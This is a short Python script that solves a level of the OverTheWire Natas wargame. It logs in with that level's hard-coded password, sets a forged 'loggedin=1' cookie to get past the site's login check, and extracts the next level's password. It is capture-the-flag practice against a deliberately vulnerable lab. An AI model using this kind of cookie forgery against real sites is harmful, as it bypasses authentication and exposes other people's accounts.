import requests
import re

usrname = 'natas5'
passwd = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

cookies = {"loggedin" : "1"}

url = "http://%s.natas.labs.overthewire.org/" % usrname

session = requests.Session()

response = session.get(url, auth = (usrname, passwd), cookies = cookies)
content = response.text

#print session.cookies['loggedin']

#print(content)

print re.findall('The password for natas6 is (.*)<' , content)[0]
